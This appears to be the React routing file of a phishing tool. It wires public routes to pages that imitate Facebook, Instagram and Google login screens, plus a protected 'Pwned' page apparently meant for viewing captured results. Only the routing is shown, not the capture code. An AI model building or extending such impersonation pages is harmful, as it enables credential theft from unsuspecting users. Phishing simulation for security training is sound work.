import { BrowserRouter, Route, Routes } from "react-router-dom";
import "./assets/App.css";

import { ToastContainer, Zoom } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";

import Home from "./pages/Home";
import Login from "./pages/Login";
import SignUp from "./pages/SignUp";
import ProtectedRoute from "./utils/protectedRoute";
import ErrorPage from "./pages/ErrorPage";
import Pwned from "./pages/Pwned";
import Settings from "./pages/Settings";

import VerifyUser from "./utils/VerifyUser";
import { verify } from "crypto";
import Facebook from "./pages/phisPages/Facebook";
import Instagram from "./pages/phisPages/Instagram";
import Google from "./pages/phisPages/Google";

const App = () => {
    return (
        <div>
            <BrowserRouter>
                <ToastContainer
                    transition={Zoom}
                    autoClose={2000}
                    position={"top-right"}
                    hideProgressBar={true}
                    newestOnTop={false}
                    closeOnClick
                    rtl={false}
                    draggable={false}
                    pauseOnHover
                    theme="dark"
                ></ToastContainer>
                <Routes>
                    <Route path="/login" element={<Login></Login>}></Route>
                    <Route path="/signUp" element={<SignUp></SignUp>}></Route>

                    <Route
                        path="/home"
                        element={
                            <ProtectedRoute>
                                <Home />
                            </ProtectedRoute>
                        }
                    />
                    <Route
                        path="/settings"
                        element={
                            <ProtectedRoute>
                                <Settings />
                            </ProtectedRoute>
                        }
                    />
                    <Route
                        path="/pwned"
                        element={
                            <ProtectedRoute>
                                <Pwned />
                            </ProtectedRoute>
                        }
                    />

                    <Route
                        path="/user/wwwfacebookcom"
                        element={<Facebook></Facebook>}
                    />
                    <Route
                        path="/user/wwwinstagramcom"
                        element={<Instagram></Instagram>}
                    />
                    <Route
                        path="/user/wwwgooglecom"
                        element={<Google></Google>}
                    />

                    {/* Default page active todos */}
                    <Route
                        path="/"
                        element={
                            <ProtectedRoute>
                                <Home />
                            </ProtectedRoute>
                        }
                    ></Route>
                    <Route path="*" element={<ErrorPage />}></Route>
                </Routes>
            </BrowserRouter>
        </div>
    );
};

export default App;
